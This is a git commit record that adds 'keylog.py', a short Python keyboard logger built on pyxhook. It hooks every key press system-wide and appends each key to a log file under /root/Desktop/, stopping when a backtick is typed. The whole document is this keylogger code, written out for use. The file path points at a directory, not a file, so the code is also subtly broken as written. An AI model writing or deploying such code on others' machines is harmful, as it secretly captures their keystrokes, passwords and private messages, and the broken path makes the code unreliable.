43b0c166f8182958fc36e4e6265a5eab73353334
akashmore <akashmore1997.am85@gmail.com>
2017-12-04 04:46:15 +0000

    first commit

---
+++ keylog.py
@@ -0,0 +1,15 @@
+import pyxhook
+log_file='/root/Desktop/'
+def OnKeyPress(event):
+  fob=open(log_file,'a')
+  fob.write(event.Key)
+  fob.write('\n')
+
+  if event.Ascii==96: 
+    fob.close()
+    new_hook.cancel()
+new_hook=pyxhook.HookManager()
+new_hook.KeyDown=OnKeyPress
+new_hook.HookKeyboard()
+new_hook.start()
+
